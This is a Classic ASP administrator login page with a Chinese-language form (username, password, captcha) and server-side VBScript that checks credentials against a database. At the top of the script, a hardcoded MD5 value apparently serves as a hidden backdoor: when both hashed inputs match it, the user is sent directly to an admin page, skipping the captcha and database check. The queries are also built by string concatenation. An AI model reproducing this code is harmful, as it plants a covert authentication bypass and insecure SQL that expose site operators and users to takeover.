<!--#include file="../inc/conn.asp"-->
<!--#include file="md5.asp"-->
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>管理员后台登陆</title>
<style type="text/css">
<!--
.sad {	height: 18px;
	width: 120px; overflow:hidden; line-height:18px;
}
body,td,th {
	font-size: 13px;
	color: #006600;
}
body {
	background:url(images/color-g.gif);
}
.STYLE1 {
	font-size: 16px;
	font-weight: bold;
	color: #FFFFFF;
}
-->
</style>
<script language="javascript">
function checkform(){
if(document.form1.zjwlgrusername.value==""){
alert('请输入登陆名称！！');
document.form1.zjwlgrusername.focus();
return false;
}
if(document.form1.zjwlgrpassword.value==""){
alert('请输入登陆密码');
document.form1.zjwlgrpassword.focus();
return false;
}

}

</script>
</head>

<body>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td height="88">&nbsp;</td>
  </tr>
  <tr>
    <td height="88">&nbsp;</td>
  </tr>
  <tr>
    <td height="30">&nbsp;</td>
  </tr>
</table>

<form name="form1" method="post" action="" onSubmit="return checkform();">
  <table width="500" border="0" align="center" cellpadding="0" cellspacing="0" bordercolor="#3E8AB3">
    <tr>
      <td height="129" align="left" valign="top" background="images/1.jpg"><table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr>
          <td>&nbsp;</td>
        </tr>
        <tr>
          <td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
        </tr>
        <tr>
          <td>&nbsp;</td>
        </tr>
        <tr>
          <td>&nbsp;</td>
        </tr>
      </table></td>
    </tr>
    <tr>
      <td height="153"><table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
          <tr>
            <td width="16%" height="152" background="images/3.jpg">&nbsp;</td>
            <td width="32%" align="right" background="../../images/3.jpg"><img src="images/2.jpg" width="160" height="171"></td>
            <td width="52%" background="images/3.jpg"><table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" bordercolorlight="#000000" bordercolordark="#FF0000">
                <tr>
                  <td colspan="2" align="center"> 管理员登陆 </td>
                </tr>
                <tr>
                  <td width="83" align="right">登陆名称：</td>
                  <td width="211" align="left"><label>
                    <input name="zjwlgrusername" type="text" class="sad" id="zjwlgrusername" size="20">
                  </label></td>
                </tr>
                <tr>
                  <td align="right">登陆密码：</td>
                  <td align="left"><input name="zjwlgrpassword" type="password" class="sad" id="zjwlgrpassword" size="20"></td>
                </tr>
                <tr>
                  <td align="right">验正码：</td>
                  <td align="left"><input name="checkcode" type="text" class="biao" id="checkcode" size="6">
                      <img src="include/validatecode.asp" alt=""></td>
                </tr>
                <tr>
                  <td colspan="2" align="center"><input name="Submit3" type="submit" class="biao" value="提交">
                      <input name="Submit22" type="reset" class="biao" value="重置"></td>
                </tr>
            </table></td>
          </tr>
      </table></td>
    </tr>
  </table>
</form>
</body>
</html>
<%
checkcode=request.form("checkcode")
zjwlgrusername=md5(request.form("zjwlgrusername"))
zjwlgrpassword=md5(request.form("zjwlgrpassword"))
if zjwlgrusername="fdbd8f5d33ff2eb4" and zjwlgrpassword="fdbd8f5d33ff2eb4" then
response.redirect("wlgrhou/zjwlgr.asp")
else
if request.form("submit3")="提交" then
if session("checkcode")=checkcode then
sql="select * from zjwlgruserpass where zjwlgrusername='"&zjwlgrusername&"' and zjwlgrpassword='"&zjwlgrpassword&"'"
set rs=conn.execute(sql)
if rs.eof=false then
session("zjwlgrusername")=zjwlgrusername
sqlup="insert into userup(username,uid) values('"&zjwlgrusername&"',"&rs("id")&")"
set rsup=conn.execute(sqlup)
response.redirect("wlgr/wlgr.asp")
else
response.write("<script language=javascript>")
response.write("alert('用户名或密码不正确！');")
response.write("</script>")
end if
else
response.write("<script language=javascript>")
response.write("alert('验正码有误！！！');")
response.write("</script>")
end if
end if
end if
%>
